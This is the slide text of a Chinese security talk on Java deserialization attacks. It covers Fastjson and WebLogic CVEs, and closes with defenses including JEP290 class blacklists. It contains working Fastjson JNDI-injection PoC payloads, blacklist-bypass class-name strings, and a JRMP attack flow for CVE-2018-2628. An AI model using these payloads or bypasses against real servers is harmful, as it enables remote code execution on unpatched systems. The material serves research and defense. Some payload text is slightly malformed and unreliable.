Java反序列化实战
绿盟科技安全研究经理
廖新喜（@xxlegend）
绿盟科技攻防实验室招人
• 研究方向：webshell检测，安全大数据分析
• 联系邮箱：liaoxinxi[@]nsfocus.com或者
liwenjin[@]nsfocus.com
•
绿盟科技 安全研究经理
•
看雪大会讲师，Pycon大会讲师，央视
专访嘉宾
•
向RedHat、Apache、Amazon，
Weblogic，阿里提交多份RCE漏洞报告
•
博客：xxlegend.com
个人介绍
反序列化入门
Fastjson
Weblogic
反序列化防御
反序列化入门
• 序列化是用于将对象转换成二进制串存储，对应着writeObject
• 反序列正好相反，将二进制串转换成对象，对应着readObject
• 类必须实现反序列化接口
序列化和反序列化
• 工具：SerializationDumper
• Magic头：0xaced
• TC_OBJECT:0x73
• TC_CLASS:0x72
• serialVersionUID
• newHandle
存储格式
• http参数，cookie，sesion，存储方式可能是base64（rO0），
压缩后的base64（H4sl），MII等
• Servlets HTTP，Sockets，Session管理器 包含的协议就包括
JMX，RMI，JMS，JNDI等（\xac\xed）
• xml Xstream,XMLDecoder等（HTTP Body：Content-
Type:application/xml）
• json(Jackson，fastjson) http请求中包含
使用场景
• Ysoserial 原生序列化PoC生成
• Marshalsec 第三方格式序列化PoC生成
• Freddy burp反序列化测试插件
• Java-Deserialization-Cheat-Sheet
反序列化项目
Fastjson Weblogic
• Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序
快速匹配”的算法，号称Java语言中最快的JSON库。
• 提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化
• 序列化
• 反序列化
Fastjson简介
• 基于TemplateImpl
• 基于JNDI
a) Bean Property类型
b) Field类型
c) Demo：https://github.com/shengqi158/fastjson-remote-code-execute-poc
Fastjson PoC分类
• 基于hash加密算法，不可逆
• 简单穷举，基本算不出来
• 爬取Maven仓库，提取所有库
Fastjson黑名单
一个loadClass的锅
1.2.43的绕过方法是 [com.sun.rowset.RowSetImp.
1.2.41的绕过方法是 Lcom.sun.rowset.RowSetImpl; 
1.2.42的绕过方法是 LLcom.sum.rowset.RowSetImpl;;
PoC示例：
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit"," "autoCommit":true}
基于ibatis
{"@type":"org.apache.ibatis.datasource.jndi.
JndiDataSourceFactory","properties":{"data_
source":"rmi://localhost:1099/Exploit"}}
1.2.45 PoC 直接利用data_source
• Weblogic是第一个成功商业化的J2EE应用服务器
• 在Oracle旗下，可以与其他Oracle产品强强联手
• WebLogic Server Java EE 应用基于标准化、模块化的组件；
WebLogic Server 为这些模块提供了一组完整的服务，无需编
程即可自动处理应用行为的许多细节
• 独有的T3协议
Weblogic
Weblogic
2017
Weblogic
序列化漏洞
CVE-2015-4852
Commons-Collections
CVE-2016-3510
MarshalledObject
CVE-2016-0638
StreamMessage
CVE-2017-3248
JRMPListener
CVE-2017-10271
XMLDecoder绕过
CVE-2017-3506
XMLDecoder
CVE-2018-2628
JRMPClient
• 基于T3
• 新的攻击面
• 基于commons-collections
• 采用黑名单修复
• 作用位置有限
CVE-2015-4852
weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream
weblogic.rjvm.MsgAbbrevInputStream.class
weblogic.iiop.Utils.class
org.apache.commons.collections.functors*
com.sun.org.apache.xalan.internal.xsltc.trax*
javassist*
org.codehaus.groovy.runtime.ConvertedClosure
org.codehaus.groovy.runtime.ConversionHandler
org.codehaus.groovy.runtime.MethodClosure
CVE-2016-0638
1，在readExternal位置加上黑名单处理机制
2，处理策略就是将ObjectInputStream换成了
FilteringObjectInputStream
• CVE-2017-3506 由于使用了存在反序列化缺陷XMLDecoder导致的漏洞
• CVE-2017-10271 是3506的绕过
• 都是挖矿主力军
• 基于http协议
基于XMLDecoder
基于XMLDecoder
CVE-2017-3506补丁只是限定object
CVE-2017-10271则限定了所有具有执行的节点
CVE-2017-3248
从resolveClass处设置了黑名单
1，从resolveProxyClass设置了黑名单
2，典型的依据PoC构造补丁
3，CVE-2018-2628雏形
• 完美绕过CVE-2017-3248
• 基于StreamMessage封装
• Activator 绕过补丁限制
• Proxy非必须项
CVE-2018-2628
CVE-2018-2628
1,MuxableSocketT3.dispatch 
2,InboundMsgAbbrev.readObject
3,ObjectInputStream.readExternalData 
4,StreamMessageImpl.readExternal
5,RemoteObject.readObject
6,UnicastRef.readExternal
7,LiveRef.read
JDK7u21
反序列
攻击流程
1，建立JRMP 服务，等待连接
2，将jrmp地址嵌入到poc中，
发送poc
3，weblogic报错，弹出计算器
Weblogic防御
•
过滤T3协议
•
设置Nginx反向代理
•
JEP290（JDK8u121，7u131，6u141）
黑名单：
maxdepth=100;
!org.codehaus.groovy.runtime.ConvertedClosure;
!org.codehaus.groovy.runtime.ConversionHandler;
!org.codehaus.groovy.runtime.MethodClosure;
!org.springframework.transaction.support.AbstractPlatformTra
nsactionManager;
!sun.rmi.server.UnicastRef;
!org.apache.commons.collections.functors.*;
!com.sun.org.apache.xalan.internal.xsltc.trax.*;
!javassist.*
反序列化防御
反序列化防御
•
不要反序列化不可信的数据
•
给反序列数据加密签名，并确保解密在反序列之前
•
给反序列化接口添加认证授权
•
反序列化服务只允许监听在本地或者开启相应防火墙
•
升级第三方库
•
升级JDK，JEP290
好消息和坏消息
•
Oracle计划放弃反序列化支持，三分之一多漏洞与之相关
•
历史包袱很重，底层机制JRMP，RMI等
•
非原生反序列机制同样存在反序列化问题
微博
公众号